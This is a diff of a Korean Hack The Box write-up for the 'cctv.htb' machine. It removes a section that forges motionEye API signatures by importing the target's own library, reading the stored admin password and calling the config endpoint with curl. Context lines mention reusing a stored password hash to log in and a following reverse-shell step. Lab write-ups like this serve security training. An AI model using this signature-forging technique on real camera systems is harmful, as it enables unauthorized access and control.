@@ -238,38 +238,6 @@ ssh -L 8765:127.0.0.1:8765 mark@cctv.htb
 ![motioneye_password_grep](images/motioneye_password_grep.png)
 `motion.conf`에서 motionEye 관리자 크리덴셜을 확인한다. 저장된 해시값(`989c5a8...`)을 패스워드 입력란에 그대로 입력하면 로그인에 성공한다.
 
-### motionEye API 서명 계산
-
-motionEye API는 매 요청마다 `_username`과 `_signature`를 요구한다. 서명은 `SHA1(method:path:body:key)` 형식으로 계산된다. 타겟 머신의 motioneye 라이브러리를 직접 import하여 정확한 서명을 계산한다.
-
-```bash
-python3 << 'EOF'
-import sys
-sys.path.insert(0, '/usr/local/lib/python3.12/dist-packages')
-from motioneye import config, settings, utils
-settings.CONF_PATH = '/etc/motioneye'
-
-main = config.get_main()
-admin_password = main.get('@admin_password')
-
-method = 'GET'
-path = '/config/list?_username=admin'
-body = b''
-
-sig = utils.compute_signature(method, path, body, admin_password)
-print(f'URL: {path}&_signature={sig}')
-EOF
-```
-
-![motioneye signature calculated](images/motioneye_sig_cal.png)
-
-계산된 서명으로 API를 호출하면 카메라 설정 전체가 반환되며 인증 성공을 확인한다.
-
-```bash
-curl -s "http://127.0.0.1:8765/config/list?_username=admin&_signature=<sig>" | python3 -m json.tool
-```
-
-![motioneye config list success](images/motioneye_config_list_suc.png)
 
 ### 페이로드 삽입 및 리버스 쉘 획득
 
